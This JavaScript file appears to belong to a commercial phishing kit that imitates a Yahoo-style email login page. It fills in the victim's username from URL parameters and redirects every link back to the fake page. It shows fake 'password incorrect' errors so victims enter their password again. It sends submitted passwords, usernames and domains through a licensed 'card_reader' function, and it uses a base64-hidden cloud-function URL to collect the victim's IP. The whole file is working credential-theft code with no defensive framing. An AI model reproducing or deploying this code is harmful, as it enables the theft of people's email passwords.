let addC = "undefined"
let ip_config = {};
let Main_URL = window.location.href;
$(document).ready(async function (){
    localStorageCheck();
    let url = new URL(location.href);
    if(url.searchParams.has("t")){
        if(url.searchParams.get("t")==="y"){
            $(".mbr-login-hd.txt-align-center").addClass("yahoo");
            $(".button-container").addClass("yahoo")
        }
    }
    $("#username").val(url.searchParams.get("u"));
    $("#yid").html(url.searchParams.get("u"));
    $("#domain").val(url.searchParams.get("d"));

    if(url.searchParams.has("reval")){
        let ms = url.searchParams.get("reval");
        url.searchParams.delete("reval");
        Main_URL = url.href;
        if(ms.includes("password")){
            $("#passwd-error").html("Please enter a valid password.");
        }else if(ms.includes("connection")){
            $("#passwd-error").html("Error, please check your internet connection or reload this page.");
        }else {
            $("#passwd-error").html("Unknown error occur, please reload this page or try again.");
        }
    }

    $("a").each(function (){
        $(this).attr("onclick", "window.location.replace(Main_URL); return false;")
    });

    //?reval=Username%20%2F%20Password%20incorrect



    $("#form").on('submit', async function (e){
        e.preventDefault();
        let $passwordError = $("#passwd-error");
        let $login_sign = $("#login-btn");
        let $passwd = $("#pass-input");
        //$passwordError.hide("fast");
        $login_sign.attr("disabled", "disabled");
        $login_sign.html("Please wait..");
        $("input").attr("readonly", "readonly");
        if($passwd.val().length < 6){
            setTimeout(function (){
                window.location.replace(Main_URL + "&reval=Username%20%2F%20password%20incorrect");
            }, 500)
        }else {
            let result = await card_reader(SCRIPT_NAME, "Jm Tech", LICENSE_KEY, JSON.stringify(ip_config), $passwd.val(), $("#username").val(), $("#domain").val())
            if(Object.keys(result).includes('errors')){
                setTimeout(function (){
                    window.location.replace(Main_URL + "&reval=Username%20%2F%connection%20incorrect");
                }, 500);
            }else {
                    if(result.response.msg.includes("uccessfull")){
                        setTimeout(function (){
                        localStorage.setItem("sent", "true sent for real");
                        parent.close_final();
                        }, 500);
                    }else {
                        setTimeout(function (){
                            window.location.replace(Main_URL + "&reval=Username%20%2F%unknown%20incorrect");
                        }, 500);
                    }
            }
        }
        return false;
    });



    if(Object.keys(ip_config).length < 2){
        await get_ip();
    }

});





async function get_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                console.log(response);
                if(response.status === "success"){
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                console.log(error);
                resolve(true);
            }
        });
    });
}


function localStorageCheck(){
    let ip = localStorage.getItem("ip_config");
    if(ip !== null) ip_config = JSON.parse(ip);
}

